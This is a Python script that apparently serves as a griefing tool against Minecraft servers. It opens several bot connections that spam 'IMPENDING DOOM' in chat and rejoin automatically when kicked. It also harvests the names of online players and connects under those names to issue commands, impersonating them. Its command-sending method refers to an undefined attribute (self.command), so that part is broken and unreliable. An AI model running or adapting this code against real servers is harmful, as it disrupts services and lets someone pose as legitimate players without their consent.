import asyncio
from random import choice

from minecraft.networking.connection import Connection
from minecraft.networking.packets import clientbound, serverbound

from protocol import ping


def random_caps(string):
    return ''.join(choice((str.upper, str.lower))(c) for c in string)


class DoomConnection:
    def __init__(self, address, port):
        self.port = port
        self.address = address
        self.ready = False

        self._connection = Connection(self.address, self.port, username=random_caps('impending doom'))
        self._connection.register_packet_listener(self.handle_evicted, clientbound.play.DisconnectPacket, early=True)
        self._connection.register_packet_listener(self.handle_login, clientbound.play.JoinGamePacket)
        self._connection.register_exception_handler(self.handle_disconnected)
        self._connection.connect()

    def handle_evicted(self, packet):
        self.ready = False

        self._connection = Connection(self.address, self.port, username=random_caps('impending doom'))
        self._connection.register_packet_listener(self.handle_evicted, clientbound.play.DisconnectPacket, early=True)
        self._connection.register_packet_listener(self.handle_login, clientbound.play.JoinGamePacket)
        self._connection.register_exception_handler(self.handle_disconnected)
        self._connection.connect()

    def handle_login(self, packet):
        self.ready = True

    def handle_disconnected(self, e, info):
        return isinstance(e, ConnectionAbortedError)

    def __getattr__(self, instance, owner=None):
        return getattr(self._connection, instance)


async def send_doom_packets(connections):
    packet = serverbound.play.ChatPacket()
    packet.message = 'IMPENDING DOOM'
    while True:
        for connection in connections:
            if connection.ready:
                connection.write_packet(packet)
                await asyncio.sleep(1/len(connections))
            else:
                await asyncio.sleep(0.05)


async def impending_doom(address, port, max=5, time=10):
    connections = [DoomConnection(address, port) for j in range(max)]

    try:
        await asyncio.wait_for(send_doom_packets(connections), timeout=time)
    except asyncio.exceptions.TimeoutError:
        pass
    for connection in connections:
        connection.disconnect(immediate=True)


class CommandConnection:
    def __init__(self, address, port, username, commands):
        self.commands = commands
        self.username = username
        self._connection = Connection(address, port, username=username)
        self._connection.register_packet_listener(self.handle_login, clientbound.play.JoinGamePacket)

    def handle_login(self, packet):
        for command in self.commands:
            chat_packet = serverbound.play.ChatPacket()
            chat_packet.message = self.command
            self._connection.write_packet(chat_packet)
            print(f'{self.username} sent {command}')

    def __getattr__(self, instance, owner=None):
        return getattr(self._connection, instance)


async def run_command(address, port, commands):
    server = await ping(f'{address}:{port}')
    player_names = [player.name for player in server.players if player.name[-1] != ' ']
    if isinstance(commands, str):
        commands = [commands]

    connections = [CommandConnection(address, port, name, commands) for name in player_names]
    for connection in connections:
        connection.connect()